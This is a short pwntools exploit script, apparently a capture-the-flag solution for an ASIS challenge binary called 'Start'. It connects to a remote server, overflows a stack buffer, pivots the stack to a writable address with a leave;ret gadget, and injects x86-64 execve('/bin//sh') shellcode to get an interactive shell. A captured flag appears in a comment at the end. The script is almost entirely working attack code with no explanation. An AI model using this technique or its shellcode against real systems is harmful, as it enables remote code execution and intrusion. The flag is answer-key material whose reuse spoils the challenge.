from pwn import *
from ctypes import *

DEBUG = 0
if DEBUG:
     p = process('./Start')
     context.log_level = 'debug'
else:
     p = remote('139.59.114.220', 10001)

writable_addr=0x601000+0x50
leave_retn=0x400550
main_addr=0x400526
shellcode =""
shellcode += "\x31\xf6\x48\xbb\x2f\x62\x69\x6e"
shellcode += "\x2f\x2f\x73\x68\x56\x53\x54\x5f"
shellcode += "\x6a\x3b\x58\x31\xd2\x0f\x05"

def pwn():
    #gdb.attach(p,'b *0x400526')
    data='a'*0x10+p64(writable_addr)+p64(0x40052E)+p64(writable_addr)+p64(main_addr)+'\n'
    p.send(data.ljust(0x400,'\x00'))
    payload='a'*0x10+p64(writable_addr)+p64(writable_addr+0x10)+shellcode
    p.send(payload.ljust(0x400,'\x00'))
    p.interactive()




if __name__ == '__main__':
   pwn()

##ASIS{y0_execstack_saves_my_l1f3}

 
    

